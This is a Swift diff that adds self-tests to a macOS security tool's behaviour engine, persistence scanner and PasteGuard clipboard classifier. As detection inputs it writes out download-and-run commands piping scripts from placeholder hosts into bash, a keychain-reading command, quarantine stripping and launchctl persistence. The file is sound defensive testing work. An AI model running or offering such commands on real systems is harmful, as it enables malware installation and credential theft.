@@ -1,6 +1,7 @@
 import Foundation
 import RampartShared
 import RampartBehaviour
+import AppKit
 
 // Owned by the behaviour build agent. Add checks with check(cond, "name").
 // Every "attack" below is a synthetic SecurityEvent (plain data); no command is executed.
@@ -371,9 +372,15 @@ extension SelfTest {
             let b2 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
             let bz2 = b2.terminalSession()
             clip(b2, pasted)
-            b2.t += 300
+            b2.t += 700
             b2.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: bz2)
-            check(!b2.ruleIDs.contains("R31"), "clipboard expires after the window")
+            check(!b2.ruleIDs.contains("R31"), "clipboard expires after the 600 s window")
+            let b4 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            let bz4 = b4.terminalSession()
+            clip(b4, pasted)
+            b4.t += 540
+            b4.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: bz4)
+            check(b4.ruleIDs.contains("R31"), "R31 still matches 9 minutes after the copy")
             let b3 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
             let bz3 = b3.terminalSession()
             clip(b3, pasted, from: "Notes")
@@ -527,6 +534,9 @@ extension SelfTest {
             let now = PersistenceSnapshot(records: sc.scanRecords())
             let diff = PersistenceDiffer.diff(baseline: loaded, current: now)
             check(diff.added.count == 1 && diff.added[0].item.label == label, "differ detects new com.rampart.test plist")
+            var partial = PersistenceSnapshot(records: [])
+            partial.incompleteKinds = [.launchAgent]
+            check(PersistenceDiffer.diff(baseline: now, current: partial).removed.isEmpty, "incomplete kinds are not reported as removed")
             check(diff.added.first?.item.target == "/tmp/com.rampart.test.bin" && diff.added.first?.attributes["runAtLoad"] == "1", "plist ProgramArguments parsed")
             let eng = BehaviourEngine(signing: behaviourTestSigning)
             let dets = eng.evaluatePersistence(added: diff.added)
@@ -543,10 +553,45 @@ extension SelfTest {
             check(d3.removed.count == 1, "differ detects removed plist")
         }
 
+        pasteGuardTests()
+
+        // --- Non-root scans never spawn authorization-prompting commands (sfltool) ---
+        do {
+            final class Recorder: @unchecked Sendable { var calls: [String] = []; let lock = NSLock()
+                func add(_ c: String) { lock.lock(); calls.append(c); lock.unlock() } }
+            let rec = Recorder()
+            let runner: PersistenceCommandRunner = { path, args, _ in rec.add(([path] + args).joined(separator: " ")); return (0, "") }
+            var cfg = PersistenceScanConfig(home: scratch)
+            cfg.launchAgentDirs = []; cfg.launchDaemonDirs = []
+            let user = PersistenceScanner(config: cfg, runner: runner, isRoot: false)
+            _ = user.scanRecords()
+            check(!rec.calls.contains { $0.contains("sfltool") }, "non-root scan never invokes sfltool (\(rec.calls))")
+            check(rec.calls.allSatisfy { PersistenceScanner.nonRootCommands.contains($0) }, "non-root scan runs only no-prompt commands")
+            check(user.lastIncompleteKinds.isSuperset(of: [.btm, .loginItem]), "non-root scan marks BTM and login items incomplete")
+            let snap = user.snapshot()
+            check(Set(snap.incompleteKinds ?? []).isSuperset(of: [.btm, .loginItem]), "snapshot carries incomplete BTM kinds")
+            let rec2 = Recorder()
+            var rootCfg = cfg; rootCfg.noPrivilegedTools = false   // fake runner: nothing is spawned
+            let root = PersistenceScanner(config: rootCfg, runner: { p, a, _ in rec2.add(([p] + a).joined(separator: " ")); return (0, "") }, isRoot: true)
+            _ = root.scanRecords()
+            check(rec2.calls.contains("/usr/bin/sfltool dumpbtm") && rec2.calls.contains("/usr/bin/profiles list -all"), "root scan uses sfltool and profiles -all")
+            let rec3 = Recorder()
+            var npCfg = cfg; npCfg.noPrivilegedTools = true
+            let np = PersistenceScanner(config: npCfg, runner: { p, a, _ in rec3.add(([p] + a).joined(separator: " ")); return (0, "") }, isRoot: true)
+            _ = np.scanRecords()
+            check(!rec3.calls.contains { c in PersistenceScanner.privilegedTools.contains { c.hasPrefix($0) } },
+                  "RAMPART_NO_PRIVILEGED_TOOLS: sfltool/profiles/systemextensionsctl never spawned, even as root (\(rec3.calls))")
+            check(np.lastIncompleteKinds.isSuperset(of: [.btm, .loginItem, .profile, .systemExtension]), "privileged kinds reported incomplete")
+        }
+
         // --- Live scan of this Mac (read-only) ---
         do {
             let t0 = Date()
-            let recs = PersistenceScanner().scanRecords()
+            // Filesystem-only live scan: the runner spawns nothing (ZERO POP-UPS rule); command output comes from fixtures above.
+            let scanner = PersistenceScanner(runner: { _, _, _ in nil }, isRoot: false)
+            let liveSnap = scanner.snapshot()
+            let recs = liveSnap.records
+            if !scanner.lastIncompleteKinds.isEmpty { print("   live scan incomplete kinds (source slow/unavailable): \(scanner.lastIncompleteKinds.map(\.rawValue).sorted())") }
             let byKind = Dictionary(grouping: recs, by: { $0.item.kind.rawValue }).mapValues(\.count)
             print("   live scan: \(recs.count) items in \(String(format: "%.1f", Date().timeIntervalSince(t0))) s: \(byKind.sorted { $0.key < $1.key })")
             check(recs.count > 0, "live persistence scan returns items")
@@ -563,5 +608,251 @@ extension SelfTest {
 enum PersistenceScannerFixtures {
     static func chromium(profileDir: String) -> [PersistenceRecord] {
         PersistenceScanner.chromiumExtensionRecords(profileDir: profileDir, browser: "Chrome")
+    }
+}
+
+// MARK: - PasteGuard tests (private named pasteboard only; no sample command is ever executed)
+
+/// Inert stub: "RAMPART-SYNTHETIC-<n>" in the text forces local score n, so blocking paths are tested
+/// without authoring attack strings. Everything else goes to the real classifier.
+struct MarkerClassifier: PasteLocalClassifier {
+    func classify(_ text: String) -> PasteLocalResult {
+        if let r = text.range(of: #"RAMPART-SYNTHETIC-(\d+)"#, options: .regularExpression),
+           let n = Int(text[r].split(separator: "-").last ?? "") {
+            return PasteLocalResult(runIntended: true, score: n, categories: [.downloadExecute], reasons: ["synthetic marker \(n)"])
+        }
+        return PasteClassifier().classify(text)
+    }
+}
+final class FixedAI: PasteAIAssessor, @unchecked Sendable {
+    let verdict: PasteAIVerdict?; var lastCommand: String?; var delay: Double
+    init(_ v: PasteAIVerdict?, delay: Double = 0) { verdict = v; self.delay = delay }
+    func assess(command: String, decoded: [String], sourceApp: String?) async -> PasteAIVerdict? {
+        lastCommand = command
+        if delay > 0 { try? await Task.sleep(nanoseconds: UInt64(delay * 1e9)) }
+        return verdict
+    }
+}
+final class WaitBox<T>: @unchecked Sendable { var v: T?; init() {} }
+func waitTask<T>(_ task: Task<T, Never>?) -> T? {
+    guard let task else { return nil }
+    let box = WaitBox<T>(); let sem = DispatchSemaphore(value: 0)
+    Task { box.v = await task.value; sem.signal() }
+    _ = sem.wait(timeout: .now() + 20)
+    return box.v
+}
+
+extension SelfTest {
+    static func pasteGuardTests() {
+        // Decision table rows
+        let D = PasteGuardDecision.decide
+        let mal = { (c: Int) in PasteAIVerdict(label: .malicious, confidence: c) }
+        check(D(95, nil).action == .block && D(95, nil).rule.hasPrefix("B1"), "B1 local ≥ 90 blocks")
+        check(D(45, mal(90)).rule.hasPrefix("B2"), "B2 AI malicious ≥ 85 + local ≥ 40 blocks")
+        check(D(39, mal(99)).action == .warn, "AI alone cannot block when local < 40")
+        check(D(72, mal(50)).rule.hasPrefix("B3"), "B3 both malicious blocks")
+        check(D(85, PasteAIVerdict(label: .benign, confidence: 90)).rule.hasPrefix("W1"), "W1 local 40–89 warns even if AI says benign")
+        check(D(10, mal(60)).rule.hasPrefix("W2"), "W2 AI malicious warns")
+        check(D(10, PasteAIVerdict(label: .suspicious, confidence: 70)).rule.hasPrefix("W3"), "W3 AI suspicious ≥ 60 warns")
+        check(D(10, PasteAIVerdict(label: .suspicious, confidence: 40)).action == .allow, "low-confidence suspicious allows")
+        check(D(0, nil).action == .allow, "A1 allows")
+
+        // Run intent + benign developer commands
+        let c = PasteClassifier()
+        check(!PasteClassifier.isRunIntended("Meeting moved to 3pm, see you there"), "prose is not run-intended")
+        check(!PasteClassifier.isRunIntended("https://example.com/page"), "a bare URL is not run-intended")
+        for cmd in ["git status", "swift build -c release", "ls -la | grep foo", "npm install", "brew install wget", "cd ~/src && make test",
+                    "docker compose up -d", "python3 -m venv .venv && source .venv/bin/activate"] {
+            let r = c.classify(cmd)
+            check(r.runIntended && r.score < 40, "benign dev command passes: \(cmd) (\(r.score))")
+        }
+        let installers = [
+            ("/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"", "Homebrew"),
+            ("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh", "rustup"),
+            ("curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash", "nvm"),
+            ("sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"", "Oh My Zsh"),
+            ("curl -fsSL https://get.docker.com | sh", "Docker"),
+        ]
+        for (cmd, name) in installers {
+            let r = c.classify(cmd)
+            check(r.allowedInstaller == name && r.score == 0, "pinned installer allowed: \(name)")
+        }
+        let unpinned = c.classify("curl -fsSL https://installer.example.test/install.sh | bash")
+        check(unpinned.allowedInstaller == nil && unpinned.score >= 40 && unpinned.score < 90 && unpinned.categories.contains(.downloadExecute),
+              "unpinned download-and-run is flagged but not blocked locally (\(unpinned.score))")
+        let sameHostOtherPath = c.classify("curl -fsSL https://raw.githubusercontent.com/someone/tools/main/install.sh | bash")
+        check(sameHostOtherPath.allowedInstaller == nil, "pin is host plus path, not host alone")
+
+        // Category recognition on everyday admin commands (none blocked on their own)
+        let q = c.classify("xattr -d com.apple.quarantine ~/Downloads/Tool.app")
+        check(q.categories.contains(.quarantineStrip) && q.score < 90, "quarantine strip recognised (\(q.score))")
+        let p = c.classify("launchctl load ~/Library/LaunchAgents/com.rampart.test.plist")
+        check(p.categories.contains(.persistence) && p.score < 90, "persistence recognised (\(p.score))")
+        let k = c.classify("security find-generic-password -s com.rampart.test.item")
+        check(k.categories.contains(.credentialAccess), "keychain access recognised")
+
+        // De-obfuscation (harmless content only)
+        let b64 = Data("echo hello rampart test".utf8).base64EncodedString()
+        check(PasteClassifier.decodeLayers("echo \(b64) | base64 -d").contains { $0.contains("hello rampart test") }, "base64 layer decoded")
+        let nested = Data("echo \(b64) | base64 -d".utf8).base64EncodedString()
+        check(PasteClassifier.decodeLayers("echo \(nested) | base64 -d").contains { $0.contains("hello rampart test") }, "two nested base64 layers decoded")
+        check(PasteClassifier.decodeLayers("echo hello%20rampart%20test").contains { $0.contains("hello rampart test") }, "URL encoding decoded")
+        check(PasteClassifier.decodeLayers("printf '\\x68\\x65\\x6c\\x6c\\x6f'").contains { $0.contains("hello") }, "hex escapes decoded")
+        check(PasteClassifier.deobfuscate("ec\"\"ho he'l'\"\"lo") == "echo he'l'lo" || PasteClassifier.deobfuscate("\"ec\"\"ho\" hi").contains("echo"), "string concatenation removed")
+        let harmlessEncoded = c.classify("echo \(b64) | base64 -d")
+        check(harmlessEncoded.categories.contains(.obfuscation) && harmlessEncoded.score < 90, "encoded harmless text is not blocked (\(harmlessEncoded.score))")
+
+        // Redaction before AI
+        let red = PasteClassifier.redact("mysql -u root -p hunter2secret && curl -H 'Authorization: Bearer abcdef123456' https://api.example.test")
+        check(!red.contains("hunter2secret") && !red.contains("abcdef123456"), "secrets redacted (\(red))")
+
+        // End-to-end on a PRIVATE named pasteboard
+        let name = NSPasteboard.Name("com.rampart.test.\(UUID().uuidString)")
+        let pb = NSPasteboard(name: name)
+        defer { pb.releaseGlobally() }
+        let board = SystemPasteboard(pb)
+        func put(_ text: String, extraType: String? = nil) {
+            pb.clearContents()
+            var types: [NSPasteboard.PasteboardType] = [.string]
+            if let e = extraType { types.append(NSPasteboard.PasteboardType(e)) }
+            pb.declareTypes(types, owner: nil)
+            pb.setString(text, forType: .string)
+            if let e = extraType { pb.setString("1", forType: NSPasteboard.PasteboardType(e)) }
+        }
+        func guardWith(_ ai: PasteAIAssessor?, timeout: Double = 4) -> PasteGuard {
+            var cfg = PasteGuardConfig(); cfg.aiTimeout = timeout
+            let g = PasteGuard(pasteboard: board, config: cfg, classifier: MarkerClassifier(), ai: ai)
+            g.sourceAppProvider = { "Safari" }
+            return g
+        }
+
+        do {
+            let g = guardWith(nil)
+            final class Sink: @unchecked Sendable { var d: [Detection] = []; var e: [SecurityEvent] = [] }
+            let sink = Sink()
+            g.onDetection = { sink.d.append($0) }
+            g.onEvent = { sink.e.append($0) }
+            let original = "echo RAMPART-SYNTHETIC-95 https://payload.example.test/run.sh"
+            put(original)
+            let o = waitTask(g.poll())
+            check(o?.action == .block, "synthetic score 95 is blocked")
+            check(pb.string(forType: .string) == PasteGuard.replacementText(sourceApp: "Safari"), "clipboard replaced with harmless comment")
+            check(PasteGuard.replacementText(sourceApp: "Safari").hasPrefix("# "), "replacement is a shell comment")
+            check(sink.d.first?.severity == .critical && sink.d.first?.name == "Dangerous pasted command blocked", "block emits critical detection")
+            check(g.blockedItems.first?.original == original, "original kept in memory for review")
+            check(sink.e.first?.detail["paste_verdict"] == "malicious" && sink.e.first?.detail["clip_tokens"] != nil
+                  && !(sink.e.first?.detail.values.contains { $0.contains("payload.example.test") } ?? true), "event carries token hashes, not text")
+            check(g.poll() == nil, "own replacement is not re-assessed")
+            let id = g.blockedItems.first!.id
+            check(!g.restore(id: id, confirmed: false) && pb.string(forType: .string) != original, "restore needs confirmation")
+            check(g.restore(id: id, confirmed: true) && pb.string(forType: .string) == original, "restore puts original back after confirmation")
+            check(g.poll() == nil && g.blockedItems.isEmpty, "restored content is not re-blocked")
+        }
+        do {
+            let g = guardWith(nil)
+            put("brew install wget")
+            let o = waitTask(g.poll())
+            check(o?.action == .allow && pb.string(forType: .string) == "brew install wget", "benign command left on the clipboard")
+            put("echo RAMPART-SYNTHETIC-99", extraType: "org.nspasteboard.ConcealedType")
+            check(g.poll() == nil && pb.string(forType: .string) == "echo RAMPART-SYNTHETIC-99", "password-manager concealed content is skipped")
+            put("Lunch at noon?")
+            check(g.poll() == nil, "non-command text is not assessed")
+        }
+        // Mocked AI: every decision branch end-to-end
+        let cases: [(Int, PasteAIVerdict?, PasteAction, String)] = [
+            (50, PasteAIVerdict(label: .malicious, confidence: 90, reasons: ["mock"]), .block, "B2"),
+            (75, PasteAIVerdict(label: .malicious, confidence: 50), .block, "B3"),
+            (50, PasteAIVerdict(label: .benign, confidence: 90), .warn, "W1"),
+            (20, PasteAIVerdict(label: .malicious, confidence: 60), .warn, "W2"),
+            (10, PasteAIVerdict(label: .suspicious, confidence: 70), .warn, "W3"),
+            (10, PasteAIVerdict(label: .benign, confidence: 95), .allow, "A1"),
+            (10, nil, .allow, "A1"),
+        ]
+        for (score, v, want, row) in cases {
+            let g = guardWith(FixedAI(v))
+            let text = "echo RAMPART-SYNTHETIC-\(score) sample.test"
+            put(text)
+            let o = waitTask(g.poll())
+            check(o?.action == want && o?.decisionRule.hasPrefix(row) == true, "AI mock row \(row): local \(score), AI \(v?.label.rawValue ?? "nil") → \(want) (got \(o?.decisionRule ?? "-"))")
+            let blockedNow = pb.string(forType: .string) != text
+            check(blockedNow == (want == .block), "clipboard changed only on block (\(row))")
+            if want == .warn { check(o?.detection?.severity == .medium, "warn detection is calm/medium (\(row))") }
+        }
+        // Timeout falls back to local
+        do {
+            let slow = FixedAI(PasteAIVerdict(label: .benign, confidence: 99), delay: 10)
+            let g = guardWith(slow, timeout: 0.5)
+            put("echo RAMPART-SYNTHETIC-95 sample.test")
+            let t0 = Date()
+            let o = waitTask(g.poll())
+            check(o?.aiTimedOut == true && o?.action == .block && Date().timeIntervalSince(t0) < 4, "AI timeout falls back to local block")
+            let g2 = guardWith(FixedAI(nil, delay: 10), timeout: 0.5)
+            put("echo RAMPART-SYNTHETIC-50 sample.test")
+            check(waitTask(g2.poll())?.action == .warn, "AI timeout with local 50 warns")
+        }
+        // AI sees redacted text only
+        do {
+            let rec = FixedAI(PasteAIVerdict(label: .benign, confidence: 50))
+            let g = guardWith(rec)
+            put("sudo mysql -u root -p hunter2secret -e 'select 1' && curl -u admin:hunter3secret https://api.example.test/status")
+            _ = waitTask(g.poll())
+            check(rec.lastCommand != nil && !(rec.lastCommand!.contains("hunter2secret")) && !(rec.lastCommand!.contains("hunter3secret")), "AI receives redacted command (\(rec.lastCommand ?? "nil"))")
+        }
+        // Suspicious paste arms R31 with a higher score in the engine
+        do {
+            let g = guardWith(nil)
+            final class Sink: @unchecked Sendable { var e: [SecurityEvent] = [] }
+            let sink = Sink(); g.onEvent = { sink.e.append($0) }
+            let text = "echo RAMPART-SYNTHETIC-50 https://payload.example.test/run.sh"
+            put(text)
+            _ = waitTask(g.poll())
+            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            let zsh = sim.terminalSession()
+            if var ev = sink.e.first { ev.date = sim.t; sim.feed(ev) }
+            sim.exec("/bin/echo", ["RAMPART-SYNTHETIC-50", "https://payload.example.test/run.sh"], parent: zsh)
+            check(sim.ruleIDs.contains("R31") && sim.detections.contains { $0.evidence.contains { $0.detail.contains("PasteGuard rated") } },
+                  "PasteGuard warning arms R31 with a boost")
+        }
+        // Access behaviour: contents are read only when the behaviour is alwaysAllow.
+        do {
+            final class FakeBoard: PasteboardAccess {
+                var accessBehavior: PasteAccessBehavior = .alwaysAllow
+                var changeCount = 1
+                var reads = 0, typeReads = 0, detects = 0
+                var text = "echo RAMPART-SYNTHETIC-95 sample.test"
+                var types: [String] { typeReads += 1; return ["public.utf8-plain-text"] }
+                func string() -> String? { reads += 1; return text }
+                func replace(with t: String) -> Int { text = t; changeCount += 1; return changeCount }
+                func detectLink() async -> Bool? { detects += 1; return false }
+            }
+            final class Behaviour: @unchecked Sendable { var v: PasteAccessBehavior = .ask }
+            let fb = FakeBoard()
+            let current = Behaviour()
+            let g = PasteGuard(pasteboard: fb, classifier: MarkerClassifier())
+            g.accessProvider = { current.v }
+            g.sourceAppProvider = { "Safari" }
+            final class Statuses: @unchecked Sendable { var s: [PasteGuardStatus] = [] }
+            let st = Statuses(); g.onStatusChange = { st.s.append($0) }
+            for b in [PasteAccessBehavior.ask, .default, .alwaysDeny] {
+                current.v = b
+                fb.changeCount += 1
+                check(g.poll() == nil, "no assessment when access is \(b.rawValue)")
+                check(fb.reads == 0 && fb.typeReads == 0, "no pasteboard read when access is \(b.rawValue)")
+            }
+            check(st.s.contains(.needsPermission) && g.status == .denied, "status reports needsPermission then denied (\(st.s.map(\.rawValue)))")
+            check(g.unreadChanges == 2, "unread changes counted without reading (\(g.unreadChanges))")
+            current.v = .alwaysDeny
+            g.start()
+            check(g.status == .denied, "start() with alwaysDeny stays disabled")
+            current.v = .alwaysAllow
+            check(g.refreshStatus() == .active, "status active once the user allows")
+            fb.changeCount += 1
+            let o = waitTask(g.poll())
+            check(fb.reads == 1 && o?.action == .block && fb.text.hasPrefix("# RamPart"), "reads and guards only with alwaysAllow")
+            g.stop()
+        }
+
+        // The user's general pasteboard was never touched by these tests.
+        check(board.pasteboard.name != .general, "tests used a private pasteboard")
     }
 }
